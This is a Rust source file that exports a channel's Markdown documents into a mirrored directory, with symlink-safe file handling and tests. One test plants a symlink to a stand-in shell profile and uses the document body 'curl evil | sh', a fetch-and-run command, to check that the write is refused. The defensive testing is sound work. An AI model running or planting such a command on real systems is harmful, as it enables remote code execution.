//! Writing a channel's documents out as files: `<slug>.md` for a live one,
//! `archive/<slug>.md` for an archived one — the shape `import` reads. The
//! directory is mirrored, not appended to: a document deleted or moved to the
//! archive loses its old file. A file without a document kind's prefix is
//! never touched, so a README or anything else kept alongside survives.

use std::collections::HashSet;
use std::os::fd::{AsFd, BorrowedFd, OwnedFd};
use std::path::Path;

use rustix::fs::{self as rfs, AtFlags, Mode, OFlags};
use rustix::io::Errno;
use std::sync::Arc;
use std::time::Duration;

use crate::config::Config;
use crate::mcp::docs::{kind_of, valid_slug};
use crate::store::{Store, StoreError};

#[derive(Debug, Clone, PartialEq)]
pub struct ExportDoc {
    pub slug: String,
    pub body: String,
    pub archived: bool,
}

#[derive(Debug, Default, PartialEq)]
pub struct Report {
    pub written: usize,
    pub unchanged: usize,
    pub removed: usize,
    pub skipped_html: usize,
}

/// Make `dir` hold exactly these documents.
///
/// The directory is opened once, as itself (`O_NOFOLLOW`), and everything
/// after happens through that descriptor: `archive` is opened from it the
/// same way, a document is read with `O_NOFOLLOW`, written to a new file
/// (`O_EXCL`, `O_NOFOLLOW`) and renamed over its name with `renameat`, and a
/// stale one removed with `unlinkat` after an `lstat`. So nothing here
/// follows a link, and nothing is written outside the directory that was
/// opened however its path changes meanwhile. A link where a document goes
/// is refused, not replaced: whoever put it there was not the node.
pub fn sync_dir(dir: &Path, docs: &[ExportDoc]) -> std::io::Result<Report> {
    std::fs::create_dir_all(dir)?;
    let fd = crate::config::path_guard::open_dir_nofollow(dir)
        .map_err(|e| refused_with(dir, "could not be opened as a directory", e))?;
    sync_fd(fd.as_fd(), docs)
}

/// `sync_dir` into a directory already open, as the path guard's
/// `open_dir` hands one over.
pub fn sync_fd(dir: BorrowedFd<'_>, docs: &[ExportDoc]) -> std::io::Result<Report> {
    let mut report = Report::default();
    let mut live = HashSet::new();
    let mut archived = HashSet::new();
    let mut archive: Option<OwnedFd> = None;
    for d in docs {
        let into = if d.archived {
            if archive.is_none() {
                archive = Some(subdir(dir, ARCHIVE, true)?.expect("made"));
            }
            archived.insert(d.slug.as_str());
            archive.as_ref().expect("opened").as_fd()
        } else {
            live.insert(d.slug.as_str());
            dir
        };
        let name = format!("{}.md", d.slug);
        if current(into, &name)?.as_deref() == Some(d.body.as_str()) {
            report.unchanged += 1;
            continue;
        }
        replace(into, &name, d.body.as_bytes())?;
        report.written += 1;
    }
    report.removed += prune(dir, &live)?;
    if archive.is_none() {
        archive = subdir(dir, ARCHIVE, false)?;
    }
    if let Some(archive) = &archive {
        report.removed += prune(archive.as_fd(), &archived)?;
    }
    Ok(report)
}

const ARCHIVE: &str = "archive";

fn refused(what: &str) -> std::io::Error {
    std::io::Error::new(
        std::io::ErrorKind::PermissionDenied,
        format!("{what}; nothing is exported there"),
    )
}

fn refused_with(path: &Path, what: &str, error: std::io::Error) -> std::io::Error {
    refused(&format!("{} {what} ({error})", path.display()))
}

/// `name` in `dir`, opened as a directory and not through a link; made
/// first when `make`. `None` when it is not there and not to be made.
fn subdir(dir: BorrowedFd<'_>, name: &str, make: bool) -> std::io::Result<Option<OwnedFd>> {
    if make {
        match rfs::mkdirat(dir, name, Mode::from_raw_mode(0o755)) {
            Ok(()) | Err(Errno::EXIST) => {}
            Err(e) => return Err(e.into()),
        }
    }
    match rfs::openat(
        dir,
        name,
        OFlags::RDONLY | OFlags::DIRECTORY | OFlags::NOFOLLOW | OFlags::CLOEXEC,
        Mode::empty(),
    ) {
        Ok(fd) => Ok(Some(fd)),
        Err(Errno::NOENT) if !make => Ok(None),
        Err(Errno::LOOP | Errno::NOTDIR) => Err(refused(&format!(
            "{name} is not a directory (a symbolic link?)"
        ))),
        Err(e) => Err(e.into()),
    }
}

/// What a document's file holds now, read without following a link; `None`
/// when there is none. Anything but a regular file is refused.
fn current(dir: BorrowedFd<'_>, name: &str) -> std::io::Result<Option<String>> {
    use std::io::Read;
    let fd = match rfs::openat(
        dir,
        name,
        OFlags::RDONLY | OFlags::NOFOLLOW | OFlags::CLOEXEC | OFlags::NONBLOCK,
        Mode::empty(),
    ) {
        Ok(fd) => fd,
        Err(Errno::NOENT) => return Ok(None),
        Err(Errno::LOOP) => {
            return Err(refused(&format!("{name} is a symbolic link")));
        }
        Err(e) => return Err(e.into()),
    };
    if !rfs::FileType::from_raw_mode(rfs::fstat(&fd)?.st_mode).is_file() {
        return Err(refused(&format!("{name} is not a regular file")));
    }
    let mut text = String::new();
    Ok(std::fs::File::from(fd)
        .read_to_string(&mut text)
        .ok()
        .map(|_| text))
}

/// Write `body` as `name` in `dir` by way of a new file renamed over it.
fn replace(dir: BorrowedFd<'_>, name: &str, body: &[u8]) -> std::io::Result<()> {
    use std::io::Write;
    let temp = format!(".{name}.{}.tmp", uuid::Uuid::now_v7().simple());
    let fd = rfs::openat(
        dir,
        temp.as_str(),
        OFlags::WRONLY | OFlags::CREATE | OFlags::EXCL | OFlags::NOFOLLOW | OFlags::CLOEXEC,
        Mode::from_raw_mode(0o644),
    )?;
    let mut file = std::fs::File::from(fd);
    let written = file.write_all(body).and_then(|()| file.sync_all());
    drop(file);
    let renamed = written.and_then(|()| Ok(rfs::renameat(dir, temp.as_str(), dir, name)?));
    if renamed.is_err() {
        let _ = rfs::unlinkat(dir, temp.as_str(), AtFlags::empty());
    }
    renamed
}

/// Remove the `<kind>-….md` files in `dir` that are no longer a document there.
fn prune(dir: BorrowedFd<'_>, keep: &HashSet<&str>) -> std::io::Result<usize> {
    let mut removed = 0;
    let mut entries = rfs::Dir::read_from(dir)?;
    let mut names = Vec::new();
    while let Some(entry) = entries.read() {
        let entry = entry?;
        if let Ok(name) = entry.file_name().to_str() {
            names.push(name.to_string());
        }
    }
    for name in names {
        let Some(slug) = name.strip_suffix(".md") else {
            continue;
        };
        if !valid_slug(slug) || kind_of(slug) == "other" || keep.contains(slug) {
            continue;
        }
        // The entry's own type, not what a link points at.
        let stat = match rfs::statat(dir, name.as_str(), AtFlags::SYMLINK_NOFOLLOW) {
            Ok(stat) => stat,
            Err(Errno::NOENT) => continue,
            Err(e) => return Err(e.into()),
        };
        if !rfs::FileType::from_raw_mode(stat.st_mode).is_file() {
            continue;
        }
        rfs::unlinkat(dir, name.as_str(), AtFlags::empty())?;
        removed += 1;
    }
    Ok(removed)
}

/// Every Markdown document on a channel, with an explicit HTML skip count.
pub fn from_store(store: &Store, channel: &str) -> Result<(Vec<ExportDoc>, usize), StoreError> {
    let mut out = Vec::new();
    let mut skipped_html = 0;
    for listed in store.doc_list(Some(channel))? {
        if listed.format == "html" {
            skipped_html += 1;
            continue;
        }
        if let Some(d) = store.doc_get(channel, &listed.slug)? {
            out.push(ExportDoc {
                slug: d.slug,
                body: d.body,
                archived: d.archived != 0,
            });
        }
    }
    Ok((out, skipped_html))
}

/// `[docs] export_dir` on its timer: at startup, then every
/// `export_every_secs`. Off while `export_dir` is unset. All three keys are
/// read again before each export, so an edit of them applies from the next
/// one; a node started with the export off looks again once a minute.
pub async fn run(store: Arc<Store>, cfg: Arc<Config>) {
    const IDLE: Duration = Duration::from_secs(60);
    let mut said_no_channel = false;
    loop {
        // Read live each time, and the guard below checks this value, the
        // one about to be written to, not the one the node started with.
        let (configured, dir, channel, every) = {
            let live = cfg.live();
            let configured = live.docs.export_dir.clone().unwrap_or_default();
            let dir = live
                .docs
                .export_dir
                .as_deref()
                .map(crate::config::expand_home);
            let channel = if live.docs.export_channel.is_empty() {
                live.session.default_channel.clone()
            } else {
                live.docs.export_channel.clone()
            };
            (
                configured,
                dir,
                channel,
                Duration::from_secs(live.docs.export_every_secs.max(60)),
            )
        };
        let Some(dir) = dir else {
            tokio::time::sleep(IDLE).await;
            continue;
        };
        if channel.is_empty() {
            if !said_no_channel {
                tracing::warn!(
                    "[docs] export_dir is set, but neither export_channel nor [session] default_channel names a channel; nothing is exported"
                );
                said_no_channel = true;
            }
            tokio::time::sleep(IDLE).await;
            continue;
        }
        said_no_channel = false;
        let (store, from) = (store.clone(), channel.clone());
        let done = tokio::task::spawn_blocking(move || {
            // Checked before every export, not only when the key was written,
            // and written only through the descriptor the check vouched for.
            let into = crate::config::path_guard::open_dir("docs.export_dir", &configured, true)
                .map_err(|e| e.to_string())?;
            let (docs, skipped_html) = from_store(&store, &from).map_err(|e| e.to_string())?;
            let mut report = sync_fd(into.as_fd(), &docs).map_err(|e| e.to_string())?;
            report.skipped_html = skipped_html;
            Ok::<_, String>(report)
        })
        .await;
        match done {
            Ok(Ok(r)) if r.written + r.removed + r.skipped_html > 0 => tracing::info!(
                written = r.written,
                removed = r.removed,
                skipped_html = r.skipped_html,
                dir = %dir.display(),
                "Markdown documents exported"
            ),
            Ok(Ok(_)) => {}
            Ok(Err(e)) => {
                tracing::warn!(error = %e, dir = %dir.display(), "document export failed")
            }
            Err(e) => tracing::warn!(error = %e, "document export stopped"),
        }
        tokio::time::sleep(every).await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn doc(slug: &str, body: &str, archived: bool) -> ExportDoc {
        ExportDoc {
            slug: slug.into(),
            body: body.into(),
            archived,
        }
    }

    /// The reviewer's probe: an agent's volume holding a marker, a document
    /// name linked to the operator's shell profile, and `archive` linked to
    /// another directory. Nothing outside the directory is written.
    #[test]
    fn links_where_documents_go_are_refused_not_written_through() {
        let root = tempfile::tempdir().unwrap();
        let dir = root.path().join("volume");
        std::fs::create_dir(&dir).unwrap();
        let victim = root.path().join("bashrc");
        std::fs::write(&victim, "original\n").unwrap();
        std::os::unix::fs::symlink(&victim, dir.join("note-pwn.md")).unwrap();
        let err = sync_dir(&dir, &[doc("note-pwn", "curl evil | sh\n", false)]).unwrap_err();
        assert_eq!(err.kind(), std::io::ErrorKind::PermissionDenied, "{err}");
        assert_eq!(std::fs::read_to_string(&victim).unwrap(), "original\n");

        std::fs::remove_file(dir.join("note-pwn.md")).unwrap();
        let elsewhere = root.path().join("elsewhere");
        std::fs::create_dir(&elsewhere).unwrap();
        std::os::unix::fs::symlink(&elsewhere, dir.join("archive")).unwrap();
        let err = sync_dir(&dir, &[doc("note-old", "body", true)]).unwrap_err();
        assert_eq!(err.kind(), std::io::ErrorKind::PermissionDenied, "{err}");
        assert_eq!(std::fs::read_dir(&elsewhere).unwrap().count(), 0);

        // The directory itself as a link is refused too.
        let link = root.path().join("link");
        std::os::unix::fs::symlink(&elsewhere, &link).unwrap();
        assert!(sync_dir(&link, &[doc("note-x", "body", false)]).is_err());
        assert_eq!(std::fs::read_dir(&elsewhere).unwrap().count(), 0);
    }

    #[test]
    fn a_directory_mirrors_the_documents_and_leaves_other_files_alone() {
        let dir = std::env::temp_dir().join(format!("tracon-export-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("archive")).unwrap();
        for (path, body) in [
            ("README.md", "keep"),
            ("notes.txt", "keep"),
            ("note-gone.md", "old"),
            ("plan-moved.md", "old"),
            ("guide-same.md", "same"),
            ("archive/ref-gone.md", "old"),
        ] {
            std::fs::write(dir.join(path), body).unwrap();
        }
        let docs = [
            doc("guide-same", "same", false),
            doc("note-new", "new", false),
            doc("plan-moved", "moved", true),
        ];
        let r = sync_dir(&dir, &docs).unwrap();
        assert_eq!(
            r,
            Report {
                written: 2,
                unchanged: 1,
                removed: 3,
                skipped_html: 0,
            }
        );
        for kept in [
            "README.md",
            "notes.txt",
            "guide-same.md",
            "note-new.md",
            "archive/plan-moved.md",
        ] {
            assert!(dir.join(kept).exists(), "{kept}");
        }
        for gone in ["note-gone.md", "plan-moved.md", "archive/ref-gone.md"] {
            assert!(!dir.join(gone).exists(), "{gone}");
        }
        assert_eq!(
            std::fs::read_to_string(dir.join("archive/plan-moved.md")).unwrap(),
            "moved"
        );
        // Run again: nothing left to do.
        assert_eq!(
            sync_dir(&dir, &docs).unwrap(),
            Report {
                written: 0,
                unchanged: 3,
                removed: 0,
                skipped_html: 0,
            }
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn store_export_reports_and_skips_html_documents() {
        let store = Store::open_in_memory().unwrap();
        store
            .write_change(
                "node",
                "personal",
                "document",
                tracon_sync::ChangeOp::Upsert,
                "markdown",
                serde_json::json!({
                    "channel": "personal",
                    "slug": "guide-markdown",
                    "kind": "guide",
                    "title": "Markdown",
                    "body": "# Markdown",
                    "hash": "hash",
                    "created_ms": 1,
                    "updated_ms": 1,
                }),
            )
            .unwrap();
        store
            .write_html_document_change(
                "node",
                "personal",
                "ref-html",
                "page.html",
                "page.html",
                vec![crate::corpus::html::HtmlFile {
                    path: "page.html".into(),
                    bytes: b"<title>HTML</title>".to_vec(),
                }],
                None,
                true,
            )
            .unwrap();
        let (docs, skipped_html) = from_store(&store, "personal").unwrap();
        assert_eq!(docs.len(), 1);
        assert_eq!(docs[0].slug, "guide-markdown");
        assert_eq!(skipped_html, 1);
    }
}
